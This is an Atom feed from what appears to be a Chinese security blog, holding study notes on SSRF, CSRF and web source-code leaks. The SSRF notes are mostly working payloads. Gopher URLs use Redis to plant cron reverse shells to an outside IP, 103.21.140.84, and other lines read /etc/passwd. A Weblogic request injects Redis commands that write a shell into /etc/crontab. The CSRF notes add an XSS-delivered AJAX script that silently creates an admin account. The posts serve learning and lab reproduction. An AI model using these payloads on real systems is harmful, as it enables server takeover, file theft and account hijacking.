<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow’s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://uknowsec.cn/"/>
  <updated>2017-07-18T05:34:42.438Z</updated>
  <id>http://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XML实体注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/uncategorized/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/uncategorized/XML实体注入漏洞的利用与学习.html</id>
    <published>2017-07-18T05:34:42.000Z</published>
    <updated>2017-07-18T05:34:42.438Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/SSRF漏洞的利用与学习.html</id>
    <published>2017-07-17T03:27:46.000Z</published>
    <updated>2017-07-18T05:27:04.811Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SSRF(Server-side Request Forge, 服务端请求伪造)。<br>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>拿常用的cURL举例，cURL默认支持的协议非常多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ curl -V</div><div class="line">curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  </div><div class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  </div><div class="line">Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets</div></pre></td></tr></table></figure>
<h4 id="本地利用姿势"><a href="#本地利用姿势" class="headerlink" title="本地利用姿势"></a>本地利用姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># dict protocol (操作Redis)</div><div class="line">curl -vvv &apos;dict://127.0.0.1:6379/info&apos;</div><div class="line"></div><div class="line"># file protocol (任意文件读取)</div><div class="line">curl -vvv &apos;file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol (一键反弹Bash)</div><div class="line"># * 注意: 链接使用单引号，避免$变量问题</div><div class="line">curl -vvv &apos;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="漏洞代码ssrf-php（未做任何SSRF防御）"><a href="#漏洞代码ssrf-php（未做任何SSRF防御）" class="headerlink" title="漏洞代码ssrf.php（未做任何SSRF防御）"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">function curl($url)&#123;  </div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div></pre></td></tr></table></figure>
<h4 id="远程利用方式"><a href="#远程利用方式" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 利用file协议任意文件读取</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</div><div class="line"></div><div class="line"># 利用dict协议查看端口</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</div><div class="line"></div><div class="line"># 利用gopher协议反弹shell</div><div class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</div></pre></td></tr></table></figure>
<h4 id="漏洞代码ssrf2-php"><a href="#漏洞代码ssrf2-php" class="headerlink" title="漏洞代码ssrf2.php"></a>漏洞代码ssrf2.php</h4><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>设置跳转重定向为True（默认不跳转）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function curl($url)&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</div><div class="line">    // 限制为HTTPS、HTTP协议</div><div class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="远程利用方式-1"><a href="#远程利用方式-1" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
<p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$schema = $_GET[&apos;s&apos;];</div><div class="line">$ip     = $_GET[&apos;i&apos;];</div><div class="line">$port   = $_GET[&apos;p&apos;];</div><div class="line">$query  = $_GET[&apos;q&apos;];</div><div class="line">if(empty($port))&#123;  </div><div class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </div><div class="line">&#125; else &#123;</div><div class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># dict protocol - 探测Redis</div><div class="line">dict://127.0.0.1:6379/info  </div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</div><div class="line"></div><div class="line"># file protocol - 任意文件读取</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol - 一键反弹Bash</div><div class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </div><div class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </div><div class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</div><div class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h2 id="Weblogic-SSRF漏洞复现"><a href="#Weblogic-SSRF漏洞复现" class="headerlink" title="Weblogic SSRF漏洞复现"></a>Weblogic SSRF漏洞复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="external">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="探查服务端口"><a href="#探查服务端口" class="headerlink" title="探查服务端口"></a>探查服务端口</h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="external">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</div><div class="line">Host: http://127.0.0.1:7001</div><div class="line">Content-Length: 133</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1:7001</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</div><div class="line">Connection: close</div><div class="line"></div><div class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</div></pre></td></tr></table></figure></p>
<p>返回以下信息，说明存在7001端口的服务器<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png" alt=""></p>
<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png" alt=""></p>
<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png" alt=""></p>
<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png" alt=""></p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf5.png" alt=""></p>
<p>反弹shell（自己测试没有成功的反弹，附上p牛的图吧）</p>
<p><img src="https://github.com/phith0n/vulhub/raw/master/weblogic/ssrf/5.png" alt=""></p>
<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="external">vulhub/weblogic/ssrf</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/CSRF漏洞的利用与学习.html</id>
    <published>2017-07-14T02:50:29.000Z</published>
    <updated>2017-07-14T07:04:36.915Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>发现漏洞可利用处-&gt;构造(搭建)搭建代码-&gt;发送给用户(管理员)-&gt;触发代码(发送请求)………</p>
<p>从这个利用的一个流程中，我们可以发现,攻击者仅仅只是做了两处工作.第一处是:发现漏洞利用处，，第二处就是构造利用代码以及发送至用户(管理员)。至于利用，你会发现CSRF与XSS不同，XSS是攻击者自己提交，等待结果，而CSRF呢，是由用户(管理员)自身提交。甚至可以说攻击者只做了构造代码的工作。</p>
<h2 id="OWASP-CSRFTester"><a href="#OWASP-CSRFTester" class="headerlink" title="OWASP CSRFTester"></a>OWASP CSRFTester</h2><p>这是OWASP推出的CSRF半自动化软件，他省去了CSRF最繁琐的过程，代码构造。下面是软件的截图‍‍</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF2.jpg" alt=""></p>
<h2 id="利用CSRFTester进行CSRF攻击"><a href="#利用CSRFTester进行CSRF攻击" class="headerlink" title="利用CSRFTester进行CSRF攻击"></a>利用CSRFTester进行CSRF攻击</h2><p>进入已经搭建的CMS后台的管理员管理模块</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF3.jpg" alt=""></p>
<p>浏览器里代理设置为CSRFTester的代理127.0.0.1：8008</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF4.jpg" alt=""></p>
<p>开启CSRFTester抓取数据包，正常添加管理员 返回可以看到已经抓取到了数据包<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF5.jpg" alt=""></p>
<p>在Form Parameters中没有找到token的值，那么就可以实现CSRF攻击</p>
<p>在Report Type中。有四种方法来进行攻击。‍‍</p>
<ul>
<li>‍‍Forms：创建一个form表单。内容为hidden(隐藏)，用户不可见（可POST、GET）‍‍<br>‍‍<em>    iFrame：创建一个iframe框架，高宽为0，用户不可见。（可POST、GET）‍‍<br>‍‍</em>    IMG：创建一个IMG标签(只能GET)。‍‍<br>‍‍<em>    XHR：创建一个AJAX请求(可POST、GET)‍‍<br>‍‍</em>    Link：创建一个a标签的超链接(只能GET)</li>
</ul>
<p>此处先选择Forms进行测试</p>
<p>点击Generate HTML 便生成了一个index.html</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF6.jpg" alt=""></p>
<p>由其中的HTML源码可以看出这是一个简单的提交表单，点击运行这个html文件<br>可以看到成功的添加了一个管理员用户</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF7.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF8.jpg" alt=""></p>
<p>到此利用CSRFTester进行CSRF攻击成功</p>
<h2 id="构造提交表单进行CSRF攻击"><a href="#构造提交表单进行CSRF攻击" class="headerlink" title="构造提交表单进行CSRF攻击"></a>构造提交表单进行CSRF攻击</h2><p>审查元素得到管理员管理的URL，进入查看源码。分析提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF9.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF10.jpg" alt=""></p>
<p>修改提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF11.jpg" alt=""></p>
<p>点击按钮提交，成功添加管理员<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF12.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF13.jpg" alt=""></p>
<p>在html中增加javascript脚本，自动提交表单<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF14.jpg" alt=""></p>
<h2 id="利用ajax结合xss进行CSRF攻击"><a href="#利用ajax结合xss进行CSRF攻击" class="headerlink" title="利用ajax结合xss进行CSRF攻击"></a>利用ajax结合xss进行CSRF攻击</h2><p>就是把CSRF的AJAX请求放到XSS里，以达到攻击的效果</p>
<p>在测试用的这套CMS的留言板处就存在存储型XSS漏洞</p>
<p>在这里我们可以使用CSRFTester生成一个ajax</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF15.jpg" alt=""></p>
<p>我们可以看到ajax中核心部分<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF16.jpg" alt=""></p>
<p>同时也可以自己编写一个简单的ajax</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var xmlhttp;</div><div class="line">if(window.XMLHttpRequest)&#123;</div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line">  &#125;else&#123;</div><div class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">  &#125;</div><div class="line">xmlhttp.open(&quot;POST&quot;,&quot;/admin/admin_manage.asp?act=add&quot;,true);</div><div class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">xmlhttp.send(&quot;admin=789&amp;password=789&amp;password3=789&amp;button=提交数据&quot;);</div></pre></td></tr></table></figure>
<p>在xss平台上配置项目<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF17.jpg" alt=""></p>
<p>然后插入测试网站的留言板里<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF18.jpg" alt=""></p>
<p>管理员查看留言信息就能添加一个管理员账号了<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF19.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF20.jpg" alt=""></p>
<h2 id="CSRF-漏洞防护"><a href="#CSRF-漏洞防护" class="headerlink" title="CSRF 漏洞防护"></a>CSRF 漏洞防护</h2><p>其实现在有关CSRF漏洞防护已经是比较成熟了，其主要防护的思路就是需要在进行后台数据修改操作的过程中，添加对当前用户身份的有效验证措施，而不能仅限于cookie的识别，这里简单的罗列了下防护措施如下。</p>
<p>（1） 来源校验</p>
<p>使用http请求头中referer来源，对客户端源进行身份校验，此方法早期使用比较多，但是仍然容易被绕过，所以这里并不建议使用。</p>
<p>（2） 用户token 校验</p>
<p>添加基于当前用户身份的有效tokens随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机token校验值，此种校验方法当前使用比较多；</p>
<p>（3）当前用户密码验证</p>
<p>在修改关键信息时，要钱当前用户输入其自身的密码，以验证当前用户身份的真伪，防止未授权的恶意操作；</p>
<p>（4）添加验证机制</p>
<p>在请求数据的提交前，需填写验证码信息提交，以增加对用户来源的有效验证，防止恶意未授权的操作产生。</p>
<p>参考链接：<br><a href="http://www.test404.com/post-1410.html" target="_blank" rel="external">http://www.test404.com/post-1410.html</a><br><a href="http://www.freebuf.com/articles/web/55965.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/55965.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>常见Web源码泄露总结</title>
    <link href="http://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/ctf/常见Web源码泄露总结.html</id>
    <published>2017-07-14T01:49:47.000Z</published>
    <updated>2017-07-14T02:00:20.346Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
<h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g. http://www.example.com/.git/config</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.example.com/.ds_store</div></pre></td></tr></table></figure>
<p>注意路径检查</p>
<p>工具：</p>
<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure></p>
